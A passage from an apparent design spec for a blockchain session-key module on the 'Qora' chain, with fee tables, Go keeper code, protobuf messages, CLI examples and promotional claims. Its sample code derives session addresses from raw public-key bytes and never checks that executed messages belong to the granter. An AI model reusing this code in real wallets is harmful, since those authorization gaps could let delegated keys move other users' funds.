â”‚  OPERATION               BASE FEE        STORAGE FEE       TOTAL           â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•     â”‚
â”‚                                                                             â”‚
â”‚  Create Session Key      0.0005 QORA      0.0005 QORA        ~0.001 QORA      â”‚
â”‚  (store ~500 bytes)                      (500 bytes)                        â”‚
â”‚                                                                             â”‚
â”‚  Use Session Key         0.0005 QORA      0.0001 QORA        ~0.0006 QORA     â”‚
â”‚  (update uses_remaining)                 (update state)                     â”‚
â”‚                                                                             â”‚
â”‚  Revoke Session Key      0.0005 QORA      -0.0005 QORA       ~0 QORA          â”‚
â”‚  (delete from storage)                   (refund storage)                   â”‚
â”‚                                                                             â”‚
â”‚  Auto-delete             0 QORA           -0.0005 QORA       REFUND          â”‚
â”‚  (on exhaustion)                         (refund to granter)                â”‚
â”‚                                                                             â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€     â”‚
â”‚                                                                             â”‚
â”‚  COMPARISON TO NORMAL TRANSACTION                                          â”‚
â”‚                                                                             â”‚
â”‚  Normal bank send:       0.0005 QORA                                        â”‚
â”‚  Session key send:       0.0006 QORA      (+0.0001 QORA = +20%)              â”‚
â”‚                                                                             â”‚
â”‚  CONCLUSION: Session key usage adds negligible cost                        â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Economic Sustainability

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        ECONOMIC SUSTAINABILITY                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  STORAGE MANAGEMENT                                                         â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                         â”‚
â”‚                                                                             â”‚
â”‚  Problem: Session keys consume chain state                                 â”‚
â”‚  Solution: Automatic cleanup + storage fees                                â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  Session Key Lifecycle                                              â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  Created â”€â”€â–º Active â”€â”€â–º Exhausted/Expired â”€â”€â–º Deleted               â”‚   â”‚
â”‚  â”‚     â”‚                          â”‚                    â”‚               â”‚   â”‚
â”‚  â”‚     â”‚                          â”‚                    â”‚               â”‚   â”‚
â”‚  â”‚     â–¼                          â–¼                    â–¼               â”‚   â”‚
â”‚  â”‚  Storage fee              Auto-delete          Storage refund       â”‚   â”‚
â”‚  â”‚  paid                     triggered            returned             â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  No orphaned keys = No state bloat                                  â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  ANTI-SPAM MEASURES                                                         â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                         â”‚
â”‚                                                                             â”‚
â”‚  â€¢ Storage fee per session key (prevents mass creation)                    â”‚
â”‚  â€¢ Rate limiting on creation (max keys per block per account)              â”‚
â”‚  â€¢ Maximum active keys per account (e.g., 100)                             â”‚
â”‚  â€¢ Minimum expiry time (prevents instant-delete spam)                      â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Implementation Specification

### Module Structure

```
x/sessionkeys/
â”œâ”€â”€ keeper/
â”‚   â”œâ”€â”€ keeper.go           # Core state management
â”‚   â”œâ”€â”€ msg_server.go       # Transaction handlers
â”‚   â”œâ”€â”€ grpc_query.go       # Query handlers
â”‚   â””â”€â”€ genesis.go          # Genesis state handling
â”œâ”€â”€ types/
â”‚   â”œâ”€â”€ session_key.pb.go   # Generated protobuf types
â”‚   â”œâ”€â”€ tx.pb.go            # Transaction message types
â”‚   â”œâ”€â”€ query.pb.go         # Query types
â”‚   â”œâ”€â”€ keys.go             # Store key prefixes
â”‚   â”œâ”€â”€ errors.go           # Custom error types
â”‚   â””â”€â”€ expected_keepers.go # Interface definitions
â”œâ”€â”€ client/
â”‚   â””â”€â”€ cli/
â”‚       â”œâ”€â”€ tx.go           # CLI transaction commands
â”‚       â””â”€â”€ query.go        # CLI query commands
â”œâ”€â”€ module.go               # Module registration
â””â”€â”€ genesis.go              # Genesis import/export
```

### Key Algorithms

```go
// CreateSessionKey - Creates a new session key
func (k Keeper) CreateSessionKey(
    ctx sdk.Context,
    granter string,
    sessionPubKey []byte,
    permissions SessionPermissions,
    maxUses uint64,
    expiresAt time.Time,
    label string,
    autoDelete bool,
) (string, error) {
    
    // 1. Validate granter has authority
    granterAddr, err := sdk.AccAddressFromBech32(granter)
    if err != nil {
        return "", err
    }
    
    // 2. Derive session address from public key
    sessionAddr := sdk.AccAddress(sessionPubKey[:20])
    
    // 3. Check for existing session key
    if k.HasSessionKey(ctx, sessionAddr.String()) {
        return "", ErrSessionKeyExists
    }
    
    // 4. Validate permissions
    if err := k.ValidatePermissions(permissions); err != nil {
        return "", err
    }
    
    // 5. Create session key object
    sessionKey := SessionKey{
        Granter:                granter,
        SessionAddress:         sessionAddr.String(),
        SessionPublicKey:       sessionPubKey,
        Permissions:            permissions,
        MaxUses:                maxUses,
        UsesRemaining:          maxUses,
        ExpiresAt:              expiresAt,
        CreatedAt:              ctx.BlockTime(),
        Label:                  label,
        AutoDeleteOnExhaustion: autoDelete,
    }
    
    // 6. Store session key
    k.SetSessionKey(ctx, sessionKey)
    
    // 7. Add to granter index
    k.SetSessionKeyByGranter(ctx, granter, sessionAddr.String())
    
    // 8. Add to expiration queue
    k.SetExpirationQueue(ctx, expiresAt, sessionAddr.String())
    
    // 9. Emit event
    ctx.EventManager().EmitEvent(
        sdk.NewEvent(
            "session_key_created",
            sdk.NewAttribute("granter", granter),
            sdk.NewAttribute("session_address", sessionAddr.String()),
            sdk.NewAttribute("expires_at", expiresAt.String()),
        ),
    )
    
    return sessionAddr.String(), nil
}

// ExecuteWithSessionKey - Executes messages using session key
func (k Keeper) ExecuteWithSessionKey(
    ctx sdk.Context,
    sessionAddr string,
    msgs []sdk.Msg,
) ([]sdk.Result, error) {
    
    // 1. Retrieve session key
    sessionKey, found := k.GetSessionKey(ctx, sessionAddr)
    if !found {
        return nil, ErrSessionKeyNotFound
    }
    
    // 2. Check expiration
    if ctx.BlockTime().After(sessionKey.ExpiresAt) {
        k.DeleteSessionKey(ctx, sessionAddr)
        return nil, ErrSessionKeyExpired
    }
    
    // 3. Check remaining uses
    if sessionKey.UsesRemaining == 0 {
        return nil, ErrNoUsesRemaining
    }
    
    // 4. Validate all messages against permissions
    for _, msg := range msgs {
        if err := k.ValidateMessagePermissions(sessionKey, msg); err != nil {
            return nil, err
        }
    }
    
    // 5. Execute messages on behalf of granter
    results := make([]sdk.Result, len(msgs))
    for i, msg := range msgs {
        // Route message to appropriate handler
        handler := k.router.Route(ctx, msg.Route())
        result, err := handler(ctx, msg)
        if err != nil {
            return nil, err
        }
        results[i] = *result
    }
    
    // 6. Decrement uses remaining
    sessionKey.UsesRemaining--
    
    // 7. Update spent amount
    sessionKey.Permissions.AmountSpent = sessionKey.Permissions.AmountSpent.Add(
        k.CalculateTotalAmount(msgs),
    )
    
    // 8. Check if exhausted
    if sessionKey.UsesRemaining == 0 && sessionKey.AutoDeleteOnExhaustion {
        k.DeleteSessionKey(ctx, sessionAddr)
        ctx.EventManager().EmitEvent(
            sdk.NewEvent("session_key_exhausted", 
                sdk.NewAttribute("session_address", sessionAddr)),
        )
    } else {
        k.SetSessionKey(ctx, sessionKey)
    }
    
    return results, nil
}

// ValidateMessagePermissions - Checks if message is allowed
func (k Keeper) ValidateMessagePermissions(
    sessionKey SessionKey,
    msg sdk.Msg,
) error {
    
    perms := sessionKey.Permissions
    
    // 1. Check message type
    if len(perms.AllowedMsgTypes) > 0 {
        msgType := sdk.MsgTypeURL(msg)
        if !contains(perms.AllowedMsgTypes, msgType) {
            return ErrMsgTypeNotAllowed
        }
    }
    
    // 2. Check amount per transaction
    amount := extractAmount(msg)
    if amount.IsAllPositive() {
        if perms.MaxAmountPerTx.IsLT(amount) {
            return ErrAmountExceedsLimit
        }
    }
    
    // 3. Check total spend limit
    newTotal := perms.AmountSpent.Add(amount)
    if perms.TotalSpendLimit.IsLT(newTotal) {
        return ErrTotalSpendExceeded
    }
    
    // 4. Check recipient
    recipient := extractRecipient(msg)
    if len(perms.AllowedRecipients) > 0 && recipient != "" {
        if !contains(perms.AllowedRecipients, recipient) {
            return ErrRecipientNotAllowed
        }
    }
    
    // 5. Check contract
    contract := extractContract(msg)
    if len(perms.AllowedContracts) > 0 && contract != "" {
        if !contains(perms.AllowedContracts, contract) {
            return ErrContractNotAllowed
        }
    }
    
    return nil
}
```

### Integration with Qora Chain

```go
// app.go modifications

import (
    "github.com/qora-protocol/qora-chain/x/sessionkeys"
    sessionkeyskeeper "github.com/qora-protocol/qora-chain/x/sessionkeys/keeper"
    sessionkeystypes "github.com/qora-protocol/qora-chain/x/sessionkeys/types"
)

// Add to AppModuleBasic
var ModuleBasics = module.NewBasicManager(
    // ... existing modules
    sessionkeys.AppModuleBasic{},
)

// Add keeper to App struct
type App struct {
    // ... existing keepers
    SessionKeysKeeper sessionkeyskeeper.Keeper
}

// Initialize keeper in NewApp
app.SessionKeysKeeper = sessionkeyskeeper.NewKeeper(
    appCodec,
    keys[sessionkeystypes.StoreKey],
    app.AccountKeeper,
    app.BankKeeper,
    app.MsgServiceRouter(),
)

// Register module
app.mm = module.NewManager(
    // ... existing modules
    sessionkeys.NewAppModule(appCodec, app.SessionKeysKeeper),
)

// Add EndBlocker for pruning expired keys
app.mm.SetOrderEndBlockers(
    // ... existing end blockers
    sessionkeystypes.ModuleName,
)
```

---

## Future Roadmap

### Phase 1: Core Implementation (Q1 2025)
- [x] Session key data structures
- [x] Basic CRUD operations
- [x] Permission validation
- [x] Auto-expiration
- [ ] Integration with Qora testnet
- [ ] Security audit

### Phase 2: WebAuthn Integration (Q2 2025)
- [ ] P-256 signature verification (already supported via precompile)
- [ ] Smart contract wallet with WebAuthn
- [ ] Browser extension with passkey support
- [ ] Mobile SDK

### Phase 3: Advanced Features (Q3 2025)
- [ ] Guardian recovery system
- [ ] Social recovery module
- [ ] Multi-signature session keys
- [ ] Spending velocity limits

### Phase 4: Ecosystem Growth (Q4 2025)
- [ ] Game SDK integration
- [ ] DeFi protocol integration
- [ ] Cross-chain session keys
- [ ] Enterprise features

---

## Conclusion

Qora Session Keys represents a significant advancement in blockchain security and usability. By implementing session keys at the protocol level, Qora achieves:

### Key Benefits

| Benefit | Impact |
|---------|--------|
| **Security** | Master keys never exposed during daily use |
| **Usability** | Seamless transactions without constant signing |
| **Cost** | Near-zero overhead compared to normal transactions |
| **Flexibility** | Granular permission controls for any use case |
| **Innovation** | Unique features like single-use keys and auto-deletion |

### Competitive Advantage

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                                                                             â”‚
â”‚   QORA SESSION KEYS: BEST-IN-CLASS SOLUTION                                 â”‚
â”‚   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                 â”‚
â”‚                                                                             â”‚
â”‚   âœ… Only chain with native single-use keys                                â”‚
â”‚   âœ… Only chain with auto-delete on exhaustion                             â”‚
â”‚   âœ… Protocol-level = no smart contract overhead                           â”‚
â”‚   âœ… P-256 support = WebAuthn/passkey ready                                â”‚
â”‚   âœ… 2000x cheaper than Ethereum alternatives                              â”‚
â”‚                                                                             â”‚
â”‚   "The most secure, usable, and cost-effective session key                 â”‚
â”‚    implementation in the blockchain industry."                              â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## References

1. Trust Wallet Security Incident (December 2024)
2. NEAR Protocol Access Keys Documentation
3. Starknet Account Abstraction Specification
4. ERC-4337: Account Abstraction Specification
5. WebAuthn W3C Standard
6. Qora Network P-256 Precompile Documentation
7. Cosmos SDK Module Development Guide

---

## Appendix A: API Reference

### Messages

```protobuf
// MsgCreateSessionKey creates a new session key
message MsgCreateSessionKey {
  string granter = 1;
  bytes session_public_key = 2;
  SessionPermissions permissions = 3;
  uint64 max_uses = 4;
  google.protobuf.Duration duration = 5;
  string label = 6;
  bool auto_delete_on_exhaustion = 7;
}

// MsgRevokeSessionKey revokes an existing session key
message MsgRevokeSessionKey {
  string granter = 1;
  string session_address = 2;
}

// MsgExecuteWithSessionKey executes messages using session key
message MsgExecuteWithSessionKey {
  string session_address = 1;
  repeated google.protobuf.Any msgs = 2;
}
```

### Queries

```protobuf
// QuerySessionKeyRequest queries a session key by address
message QuerySessionKeyRequest {
  string session_address = 1;
}

// QuerySessionKeysByGranterRequest queries all session keys for a granter
message QuerySessionKeysByGranterRequest {
  string granter = 1;
  cosmos.base.query.v1beta1.PageRequest pagination = 2;
}
```

---

## Appendix B: CLI Commands

```bash
# Create a session key
qorad tx sessionkeys create [session-pubkey] \
  --max-uses 100 \
  --max-amount 1000000uqora \
  --total-limit 5000000uqora \
  --allowed-contracts qora1contract... \
  --expires-in 24h \
  --auto-delete \
  --from mykey

# Query session key
qorad query sessionkeys key [session-address]

# Query all session keys for an account
qorad query sessionkeys list-by-granter [granter-address]

# Revoke session key
qorad tx sessionkeys revoke [session-address] --from mykey

# Execute with session key
qorad tx bank send [session-address] [recipient] 100uqora \
  --session-key [session-private-key-path]
```

---

## License

Apache 2.0

---

## Contributing

We welcome contributions! Please see CONTRIBUTING.md for guidelines.

---

*Last Updated: December 2024*
*Qora Network - Building the Future of Secure Blockchain Interactions*
